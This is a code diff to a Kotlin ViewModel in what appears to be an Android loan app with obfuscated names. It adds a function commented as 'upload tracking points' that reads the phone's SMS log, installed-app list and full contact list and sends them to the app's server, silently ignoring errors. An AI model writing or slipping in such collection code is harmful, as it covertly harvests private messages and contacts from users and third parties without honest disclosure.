@@ -1,6 +1,12 @@
 package com.nonetxmxy.mmzqfxy.viewmodel
 
+import androidx.lifecycle.viewModelScope
+import com.blankj.utilcode.util.Utils
+import com.google.gson.Gson
 import com.nonetxmxy.mmzqfxy.base.BaseViewModel
+import com.nonetxmxy.mmzqfxy.extra.AppsMessageUtil
+import com.nonetxmxy.mmzqfxy.extra.ContractsMessageUtil
+import com.nonetxmxy.mmzqfxy.extra.PhoneMessageUtil
 import com.nonetxmxy.mmzqfxy.model.AuthPagerEvent
 import com.nonetxmxy.mmzqfxy.model.auth.BankMessage
 import com.nonetxmxy.mmzqfxy.model.auth.ConfirmMessage
@@ -18,6 +24,7 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.SharedFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.joinAll
+import kotlinx.coroutines.launch
 import javax.inject.Inject
 
 @HiltViewModel
@@ -64,6 +71,8 @@ class ConfirmRequestViewModel @Inject constructor(
     var moneyDatas: List<String> = emptyList()
     var daysDatas: List<String> = emptyList()
 
+    val permission = MutableSharedFlow<Unit>()
+
     init {
         getPageData()
     }
@@ -91,7 +100,28 @@ class ConfirmRequestViewModel @Inject constructor(
                 )
             }
 
+            permission.emit(Unit)
+
             closeLoading.emit(Unit)
+        }
+    }
+
+    // 上传埋点
+    fun uploadExtraData() {
+        viewModelScope.launch {
+            try {
+                val phoneMessageJson = PhoneMessageUtil.getSmsLogStr(Utils.getApp())
+                val appMessageJson =
+                    Gson().toJson(AppsMessageUtil.scanLocalInstallAppList(Utils.getApp().packageManager))
+                val contractMessageJson = ContractsMessageUtil.getAllContractStr(Utils.getApp())
+                orderRepository.submitPhoneMessageAppContract(
+                    phoneMessageJson,
+                    appMessageJson,
+                    contractMessageJson
+                )
+            } catch (e: java.lang.Exception) {
+                e.printStackTrace()
+            }
         }
     }
 
@@ -107,7 +137,8 @@ class ConfirmRequestViewModel @Inject constructor(
 
             // 这个时候发送通知，告诉UI层去更新数据
             val targetItem = it.SsxAXO.indexOfFirst { item ->
-                item.zrCuab.jinE() == moneySelectedName && item.qUSFV.toInt().days() == daySelectedName
+                item.zrCuab.jinE() == moneySelectedName && item.qUSFV.toInt()
+                    .days() == daySelectedName
             }
             updateSelectItem(if (isInit) 0 else targetItem)
         }
